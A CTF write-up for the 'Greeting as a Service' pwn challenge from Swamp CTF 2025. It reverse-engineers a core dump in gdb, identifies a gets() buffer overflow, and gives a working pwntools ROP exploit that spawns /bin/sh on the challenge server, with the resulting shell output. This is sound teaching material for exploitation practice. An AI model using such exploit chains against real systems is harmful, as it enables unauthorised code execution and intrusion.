---
title: Greeting as a Service
date: 2025-03-30T17:34:37+03:00
description: Writeup for Greeting as a Service [Swamp CTF 2025]
type: writeup
type: writeup
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

A friend of mine set up a greeting as a service server. He gave me a core dump of it to play around with but won't give me source. Find anything useful?

## Intuition

We get a coredump of the remote service. A coredump can't be explored by executing instructions, but the memory can be examined.
Based on the backtrace, I guess we are in some kind of `main()` function:

```
$ gdb -q -core ./coredump_GAAS
pwndbg> bt
#0  0x00000000004011a3 in ?? ()
#1  0x00007ffff7de8083 in ?? ()
#2  0x00007ffff7ffc620 in ?? ()
#3  0x00007fffffffde68 in ?? ()
#4  0x0000000100000000 in ?? ()
#5  0x00000000004011a3 in ?? ()
#6  0x0000000000401240 in ?? ()
#7  0xbdeebaa290c7ef1c in ?? ()
#8  0x0000000000401090 in ?? ()
#9  0x00007fffffffde60 in ?? ()
#10 0x0000000000000000 in ?? ()
```

This guess is purelt based on the return addresses. I think from number 4 onwards it's just random values found on the stack, but the addresses 1 to 3 are probably entry functions from libc, like `libc_start_main()`.
So that leaves address 0 to be the `main()` function. Let's disassemble it:

```
pwndbg> x/33i $rip
=> 0x4011a3:	endbr64 
   0x4011a7:	push   rbp
   0x4011a8:	mov    rbp,rsp
   0x4011ab:	sub    rsp,0x10
   0x4011af:	mov    rax,QWORD PTR [rip+0x2e9a]        # 0x404050
   0x4011b6:	mov    ecx,0x0
   0x4011bb:	mov    edx,0x2
   0x4011c0:	mov    esi,0x0
   0x4011c5:	mov    rdi,rax
   0x4011c8:	call   0x401080
   0x4011cd:	mov    rax,QWORD PTR [rip+0x2e6c]        # 0x404040
   0x4011d4:	mov    ecx,0x0
   0x4011d9:	mov    edx,0x2
   0x4011de:	mov    esi,0x0
   0x4011e3:	mov    rdi,rax
   0x4011e6:	call   0x401080
   0x4011eb:	mov    QWORD PTR [rbp-0xa],0x0
   0x4011f3:	mov    WORD PTR [rbp-0x2],0x0
   0x4011f9:	lea    rdi,[rip+0xe04]        # 0x402004
   0x401200:	mov    eax,0x0
   0x401205:	call   0x401060
   0x40120a:	lea    rax,[rbp-0xa]
   0x40120e:	mov    rdi,rax
   0x401211:	mov    eax,0x0
   0x401216:	call   0x401070
   0x40121b:	lea    rax,[rbp-0xa]
   0x40121f:	mov    rsi,rax
   0x401222:	lea    rdi,[rip+0xdee]        # 0x402017
   0x401229:	mov    eax,0x0
   0x40122e:	call   0x401060
   0x401233:	mov    eax,0x0
   0x401238:	leave  
   0x401239:	ret
```

We can notice 5 calls, let's break them down:

- The first two calls, at `0x4011c8`, and `0x4011e6` are to the same address: `0x401080`. Additionally, they function called seems to have the following signature, based on loaded registers: `void func(long? a, int b, int c, int d)`. Additionally, `b` is always 0, `c` is always 2, `d` is always 0. We can see by printing the address where it takes `a` from, that it is most likely a file structure:

```
pwndbg> x/10gx 0x404050
0x404050:	0x00007ffff7fb0980	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000000000
0x404070:	0x0000000000000000	0x0000000000000000
0x404080:	0x0000000000000000	0x0000000000000000
0x404090:	0x0000000000000000	0x0000000000000000
pwndbg> x/10gx 0x00007ffff7fb0980
0x7ffff7fb0980:	0x00000000fbad2088	0x0000000000000000
0x7ffff7fb0990:	0x0000000000000000	0x0000000000000000
0x7ffff7fb09a0:	0x0000000000000000	0x0000000000000000
0x7ffff7fb09b0:	0x0000000000000000	0x0000000000000000
0x7ffff7fb09c0:	0x0000000000000000	0x0000000000000000
```

Very often I have seen `fbad...` inside the flags field of `FILE` objects. So I realized this is probably `stdin` or `stdout` from libc. Then I thought what function signature that takes a `FILE` pointer in the first slot could be called here.
Given almost all pwn challenges disable buffering on `stdout` and `stdin` before the actuall program, I realized this is probably `setvbuf`: `int setvbuf(FILE *stream, char *buf, int mode, size_t size)`.

It fits perfectly and `buf` can be NULL.

Additionally, another hint that this (and actually the others too) are libc functions is the fact that disassembling the address of the function it calls yields instructions that look **a lot** like they're from the PLT section of a binary:

```
pwndbg> x/3i 0x401080
   0x401080:	endbr64 
   0x401084:	bnd jmp QWORD PTR [rip+0x2f9d]        # 0x404028
   0x40108b:	nop    DWORD PTR [rax+rax*1+0x0]
```

Continuing the analysis, we can see an array of 10 bytes is initialized with 0 next:

```
   0x4011eb:	mov    QWORD PTR [rbp-0xa],0x0 ; <--- 8 bytes
   0x4011f3:	mov    WORD PTR [rbp-0x2],0x0  ; <--- 2 bytes
```

Then this pattern of calls:

```
   0x4011f9:	lea    rdi,[rip+0xe04]        # 0x402004
   0x401200:	mov    eax,0x0
   0x401205:	call   0x401060
   0x40120a:	lea    rax,[rbp-0xa]
   0x40120e:	mov    rdi,rax
   0x401211:	mov    eax,0x0
   0x401216:	call   0x401070
   0x40121b:	lea    rax,[rbp-0xa]
   0x40121f:	mov    rsi,rax
   0x401222:	lea    rdi,[rip+0xdee]        # 0x402017
   0x401229:	mov    eax,0x0
   0x40122e:	call   0x401060
```

We can notice function `0x401060` takes only one string argument. The argument is:

```
pwndbg> x/1gx 0x402004
0x402004:	Cannot access memory at address 0x402004
```

Uhh? That's weird. What are the mappings:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /mnt/c/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXa.out
          0x401000           0x402000 r-xp     1000   1000 /mnt/c/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXa.out
          0x403000           0x404000 r--p     1000   2000 /mnt/c/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXa.out
          0x404000           0x405000 ---p     1000   3000 /mnt/c/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXa.out
```

Where is that???? Well here we did even more guesswork, where I remembered I had seen cases before where the read-only segment of memory is doubled in a binary,
with it being both at `0x403000` and `0x402000`. So I said "well let's check 0x403004" then:

```
pwndbg> x/1gx 0x403004
0x403004:	0x2073692074616857
pwndbg> x/1s 0x403004
0x403004:	"What is your name?"
```

Great! This is also the thing printed when you connect to the remote, without and newlines. So then `0x401060` MUST be `printf()`.

All that is left now is figuring out what `0x401070` is. Judging from the fact that it takes only one argument, a buffer pointer (the one that was initialized earlier), We thought it MUST be `gets()`, because the remote target is waiting for input at this point.

So we have a simple buffer overflow and we can ROP chain. Lots of gadgets to choose from as well.

## Solution

We reuse the ideas from the [HTB Cyber Apocalypse 2025 Crossbow challenge](https://dothidden.xyz/cyber_apocalypse_ctf_2025/crossbow/).

Syscall a `read()`, insert `/bin/sh`, syscall `execve()`, win.

```py
#!/usr/bin/env python3

from pwn import *

pop_rdi = 0x0000000000401194
pop_rsi = 0x0000000000401196
pop_rax = 0x0000000000401188
pop_rdx = 0x0000000000401198
syscall = 0x0000000000401190
data_addr = 0x404060
gets = 0x401070

payload = b"a" * 0xa + b"b" * 8 + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(data_addr) + p64(gets) + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(data_addr + 16) + p64(pop_rsi) + p64(data_addr) + p64(pop_rdx) + p64(0) + p64(syscall)

fake_execve = p64(data_addr + 16) + p64(0) + b"/bin/sh\x00"

target = remote("chals.swampctf.com", 40003)
target.sendline(payload)
target.sendline(fake_execve)
target.interactive()
```

### Flag

```
$ ./solve.py 
[+] Opening connection to chals.swampctf.com on port 40003: Done
[*] Switching to interactive mode
What is your name?Hello, aaaaaaaaaabbbbbbbb\x88\x11!
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
$ cat flag.txt
swampCTF{t1m3_t0_s@y_g00dby3}
```

